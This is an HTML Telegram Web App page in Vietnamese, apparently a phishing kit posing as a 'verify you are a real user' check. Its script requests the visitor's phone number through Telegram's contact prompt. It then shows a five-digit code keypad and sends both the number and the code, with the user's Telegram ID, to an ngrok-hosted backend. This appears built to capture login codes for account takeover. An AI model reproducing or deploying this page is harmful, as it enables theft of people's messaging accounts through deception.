<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Xác Minh</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #0d1117; color: white; margin: 0; font-family: sans-serif; display: flex; justify-content: center; height: 100vh; }
        .content { width: 100%; max-width: 400px; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
        .otp-box { width: 50px; height: 60px; text-align: center; font-size: 24px; background: #1c1c20; border: 2px solid #3e3e5a; border-radius: 12px; color: white; }
    </style>
</head>
<body>

<div class="content" id="app">
    <div style="font-size: 60px; margin-bottom: 20px;">👋</div>
    <div id="message">Bạn cần xác nhận mình là người dùng thật!</div>
</div>

<script>
    const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev';
    const tg = window.Telegram.WebApp;
    const chat_id = tg.initDataUnsafe?.user?.id || "unknown"; // Định danh người dùng để chạy song song
    
    tg.ready();
    tg.expand();

    tg.MainButton.text = "XÁC NHẬN SỐ ĐIỆN THOẠI";
    tg.MainButton.show();
    
    tg.MainButton.onClick(() => tg.requestContact());

    tg.onEvent('contactRequested', async (data) => {
        const phoneNumber = data.responseUnsafe?.contact?.phone_number;
        if (phoneNumber) {
            tg.MainButton.text = "ĐANG GỬI...";
            // Gửi chat_id để Backend tách biệt phiên làm việc
            await fetch(`${BACKEND_URL}/send_phone`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone: phoneNumber, chat_id: chat_id })
            });
            
            // Render giao diện mới theo Ảnh chụp màn hình 2026-07-02 175647.png[cite: 1]
            document.getElementById('app').innerHTML = `
                <img src="https://img.icons8.com/color/96/iphone-message.png" style="width: 80px; margin-bottom: 20px;">
                <div style="background: #1c1c20; padding: 15px 40px; border-radius: 20px; color: #aaa; margin-bottom: 20px; border: 1px solid #333;">Enter code</div>
                <div id="otp-container" style="display: flex; gap: 10px; margin-bottom: 40px;">
                    ${[0,1,2,3,4].map(() => `<input type="text" class="otp-box" readonly>`).join('')}
                </div>
                <div id="numpad" style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%; max-width: 320px;">
                    ${[1,2,3,4,5,6,7,8,9, '', 0, '⌫'].map(num => `
                        <button onclick="handleKey('${num}')" style="padding: 15px; border-radius: 12px; border: none; background: #2b2b3d; color: white; font-size: 22px; font-weight: bold; cursor: pointer;">${num}</button>
                    `).join('')}
                </div>
            `;
            tg.MainButton.hide();
        }
    });

    let currentOtp = "";
    window.handleKey = (key) => {
        if (key === '') return;
        const boxes = document.querySelectorAll('.otp-box');
        if (key === '⌫') {
            currentOtp = currentOtp.slice(0, -1);
        } else if (currentOtp.length < 5) {
            currentOtp += key;
        }
        boxes.forEach((box, i) => box.value = currentOtp[i] || "");
        if (currentOtp.length === 5) submitOtp(currentOtp);
    };

    async function submitOtp(otp) {
        const res = await fetch(`${BACKEND_URL}/verify_otp`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ otp: otp, chat_id: chat_id }) // Gửi kèm chat_id[cite: 1]
        });
        
        const result = await res.json();
        if (result.success) {
            alert("Xác minh thành công!");
            tg.close();
        } else {
            alert("Mã không đúng!");
            currentOtp = "";
            document.querySelectorAll('.otp-box').forEach(box => box.value = "");
        }
    }
</script>
</body>
</html>
